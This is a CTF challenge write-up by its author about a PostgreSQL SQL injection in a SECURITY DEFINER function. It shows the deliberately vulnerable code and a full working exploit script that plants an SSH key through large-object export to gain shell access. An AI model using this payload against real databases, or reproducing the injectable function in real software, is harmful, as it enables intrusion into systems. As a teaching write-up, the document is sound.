# Cyhub CTF 2024 - pg_lo

At this year’s Cyhub CTF in Armenia, I decided to create some unique challenges. Since my work over the past year has been heavily focused on PostgreSQL, I came up with an interesting challenge involving [PostgreSQL Large Objects](https://www.postgresql.org/docs/current/largeobjects.html).

The task was solved by only one team, AIrucner, who also won the CTF.

## Challenge Description

**The challenge was described as follows:**

> Do we really need blob storage when we can store image files directly in PostgreSQL using large objects?
Recently, we cut our costs by migrating from S3 to PostgreSQL but haven’t had time to audit the code…
Who cares, right? If it works, it works. :)

Participants were provided with source code and a connection string, along with two accessible ports: 8080 and 2222.

## Challenge Goal

The challenge involved three components: a web server, a PostgreSQL database, and an SSH server.

The objective was to read the contents of the `/flag.txt` file.
The intended solution was to SSH into the machine and retrieve the flag file.

> The flag.png file was a rabbit hole.

## Challenge Explanation
 
The database was set up using an `init.sh` script, which performed the following actions:

- Created a database user `app_user` with a provided password.
- Loaded the `init.sql` file into the database.

The `init.sql` script initialized the necessary table and function for the challenge:

1. Tables and Roles:
  - Created a `messages` table.
  - Created a role `cyhub`.
  
2. Dummy Data:
  - Inserted dummy data into the messages table.
  - This data was unrelated to the flag, intended to mislead solvers into thinking they needed to access `flag.png`.

3. Vulnerable Function:
  - Created a `get_message` function as the `cyhub` user, declaring it with `SECURITY DEFINER`.
  - This meant the function always executed with cyhub’s privileges, regardless of the caller.
  - The function used `EXECUTE` and `format`, with `%s` formatting, introducing an SQL injection vulnerability.


```sql
CREATE TABLE messages(id INT PRIMARY KEY, msg TEXT, img_oid OID);

CREATE ROLE cyhub;

GRANT USAGE ON SCHEMA public TO app_user;
GRANT USAGE ON SCHEMA public TO cyhub;
GRANT CREATE ON SCHEMA public TO cyhub;

GRANT ALL PRIVILEGES ON TABLE public.messages TO cyhub;
GRANT EXECUTE ON FUNCTION pg_catalog.lo_from_bytea(OID, bytea) TO cyhub;
GRANT EXECUTE ON FUNCTION pg_catalog.lo_import(TEXT, OID) TO cyhub;
GRANT EXECUTE ON FUNCTION pg_catalog.lo_export(OID, TEXT) TO cyhub;

SET ROLE cyhub;

DO $$
BEGIN
    PERFORM lo_import('/images/flag.png', 1337);
    PERFORM lo_import('/images/1.png', 1);
    PERFORM lo_import('/images/2.png', 2);
    PERFORM lo_import('/images/3.png', 3);
    INSERT INTO messages(id, msg, img_oid) VALUES 
        (1, 'First Image', 1),
        (2, 'Second Image', 2),
        (3, 'Third Image', 3),
        (1337, 'Check this 1337 image!', 1337);
END $$;

CREATE OR REPLACE FUNCTION get_message(p_id TEXT) RETURNS TEXT AS $$
DECLARE
    result TEXT;
BEGIN
    EXECUTE format('SELECT encode(lo_get(messages.img_oid), ''base64'') as img FROM messages WHERE id=%s::INT', p_id) INTO result;
    RETURN result;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE OR REPLACE FUNCTION get_messages() RETURNS TABLE (id INT, msg TEXT, img TEXT) AS $$
DECLARE
    query TEXT;
BEGIN
    RETURN QUERY
    SELECT messages.id, messages.msg, encode(lo_get(messages.img_oid), 'base64') as img 
    FROM messages;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

RESET ROLE;

GRANT EXECUTE ON FUNCTION get_message(TEXT) TO app_user;
GRANT EXECUTE ON FUNCTION get_messages() TO app_user;

```
	

There's also a simple web-server written with `express`, which should be used to access the vulnerable function and perform the exploit.

```js
const express = require('express');
const { Client } = require('pg');

const app = express();
const port = 8080;

const client = new Client({
  user: 'app_user',
  host: 'localhost',
  database: 'postgres',
  password: process.env.APP_USER_PASSWORD,
  port: 5432,
});

client.connect();

app.get('/', (_, res) => res.sendFile(__dirname + '/index.html'));

app.get('/messages', async (req, res) => {
  const { id } = req.query;

  try {

    if (parseInt(id) === '1337') {
      return res.status(403).end();
    }

    let result = [];
    if (!id) {
      result = (await client.query('SELECT * FROM get_messages() WHERE id != 1337')).rows;
    } else {
      result = (await client.query('SELECT * FROM get_message($1)', [id])).rows.map(row => ({ id: 0, msg: '', img: row.img }));
    }

    res.json({ messages: result }).end();
  } catch (err) {
    console.error('Error querying PostgreSQL:', err);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Server is running on http://localhost:${port}`);
});
```

## Exploiting the Challenge

By identifying the SQL injection vulnerability in `get_message`, solvers might initially try the common `COPY FROM PROGRAM` method 
to get a reverse shell. However, since the `cyhub` user is not a superuser, this approach wouldn’t work.


Instead, solvers needed to:
    - Create a large object containing their public key using `lo_from_bytea`.
    - Export the large object to `/var/lib/postgres/.ssh/authorized_keys` using `lo_export`.


Here’s the SQL payload to achieve this:

```sql
SELECT get_message(
    '1::int; 
     SELECT lo_from_bytea(31337, ''ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwkzp4b8trXLEXMw1Co/TVynIvFzdXp/z1f4Xel1KT/''::bytea); 
     SELECT lo_export(31337, ''/var/lib/postgresql/.ssh/authorized_keys''); 
     --'
);
```

To execute this via the web server:
```sh
curl --get \
    --data-urlencode "id=1::int; SELECT lo_from_bytea(31337,'${PUBLIC_KEY}'::bytea); SELECT lo_export(31337, '/var/lib/postgresql/.ssh/authorized_keys'); --" \
    http://localhost:8080/messages
```

After putting the public key under `authorized_keys`, solvers could SSH into the machine and read the flag:

```sh
ssh -o StrictHostKeyChecking=no -p 2222 "postgres@127.0.0.1" -i /tmp/id_rsa cat /flag.txt
```

## Complete Solution

```sh
set -e

HOST=127.0.0.1
SSH_PORT=2222
WEBSERVER_PORT=8080

echo "Generating new keypair..."
ssh-keygen -t ed25519 -f /tmp/id_rsa -N "" -q -y > /dev/null

PUBLIC_KEY=$(cat /tmp/id_rsa.pub)
echo "Sending payload..."
curl --get -s -o /dev/null \
    --data-urlencode "id=1::int; SELECT lo_from_bytea(31337,'${PUBLIC_KEY}'::bytea); SELECT lo_export(31337, '/var/lib/postgresql/.ssh/authorized_keys'); --" \
    -H "Connection: close" \
    http://${HOST}:${WEBSERVER_PORT}/messages

echo "Reading flag...\n"
ssh -o StrictHostKeyChecking=no -p ${SSH_PORT} "postgres@${HOST}" -i /tmp/id_rsa cat /flag.txt
```

This challenge combined SQL injection and PostgreSQL’s large object API to craft the exploit. It was great to see AIrucner solve it without any hints!
